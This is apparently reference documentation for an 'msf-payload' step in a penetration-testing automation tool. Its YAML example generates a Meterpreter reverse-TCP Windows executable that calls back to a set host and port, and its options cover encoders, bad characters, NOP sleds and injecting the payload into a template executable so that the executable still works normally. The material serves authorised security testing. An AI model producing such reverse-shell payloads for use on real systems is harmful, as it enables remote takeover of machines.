===========
msf-payload
===========

Generate a Metasploit payload and save it to a file.

.. code-block:: yaml

   commands:
     - type: msf-payload
       cmd: windows/meterpreter/reverse_tcp
       format: exe
       payload_options:
         LHOST: 192.168.100.1
         LPORT: 1111
       local_path: /tmp/payload.exe

     - type: shell
       cmd: cat $LAST_MSF_PAYLOAD

.. confval:: cmd

   The payload to generate (e.g. ``windows/meterpreter/reverse_tcp``).

   :type: str
   :required: True

.. confval:: payload_options

   Key-value pairs of payload options such as ``LHOST`` and ``LPORT``.

   :type: Dict[str, str]

.. confval:: format

   Output format for the generated payload. Run ``msfvenom --list formats``
   for supported values or see the Metasploit documentation.

   :type: str
   :default: ``raw``

.. confval:: local_path

   Path where the generated payload will be saved. If not set, the payload
   is saved to a temporary path accessible via ``$LAST_MSF_PAYLOAD``.

   :type: str

.. confval:: platform

   Target platform for the payload. Run ``msfvenom --list platforms``
   for supported values.

   :type: str

.. confval:: encoder

   Encoder to apply to the payload. Run ``msfvenom --list encoders``
   for supported values.

   :type: str

.. confval:: badchars

   Characters to avoid in the generated payload (e.g. ``'\x00\xff'``).

   :type: str

.. confval:: force_encode

   Force encoding even if no encoder is explicitly specified.

   :type: bool
   :default: ``False``

.. confval:: nopsled_size

   Number of NOP bytes (nopsled) to prepend to the payload.

   :type: int
   :default: ``0``

.. confval:: template

   Path to a custom executable to use as a template for the payload.

   :type: str

.. confval:: keep_template_working

   Inject the payload as a new thread so the template executable continues
   to function normally.

   :type: bool
   :default: ``False``

.. confval:: iter

   Number of times to apply the encoder.

   :type: int
   :default: ``0``
